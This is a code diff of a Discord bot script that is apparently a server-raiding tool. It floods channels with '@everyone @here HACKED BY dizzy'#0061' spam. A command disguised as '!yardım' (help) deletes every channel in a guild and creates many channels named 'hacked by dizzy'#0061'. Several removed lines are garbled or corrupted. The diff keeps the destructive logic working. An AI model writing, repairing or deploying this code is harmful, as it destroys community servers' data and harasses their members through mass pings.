@@ -148,7 +148,7 @@ client.on('message', msg => {
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");//by dizzy'#0061.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
         msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
@@ -157,7 +157,7 @@ client.on('message', msg => {
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
-    msg.ch#0061.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
+    msg.channel.send(" **)==========0 HACKED BY dizzy'#0061 0==========(** @everyone @here  ");
     
     
     
@@ -165,22 +165,13 @@ client.on('message', msg => {
     
   }
 });
-
-client.on("message", async msg => {//by dizzy'#0061nt === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
+client.on("message", async msg => {
+  if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
-     msg.guild.channels.cache.forEach(c => {c.delete()//by dizzy'#0061        await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"//by diizy'#0061
-    });
-     await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"//by diizy'#0061
-    });
-     await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"// by dizzy'#0061
-    });
-     await msg.guild.channels.create("hacked by dizzy'#0061", {
-      type: "text"
-    });
+     msg.guild.channels.cache.forEach(c => {c.delete()
+
+    
      await msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
     }); await msg.guild.channels.create("hacked by dizzy'#0061", {
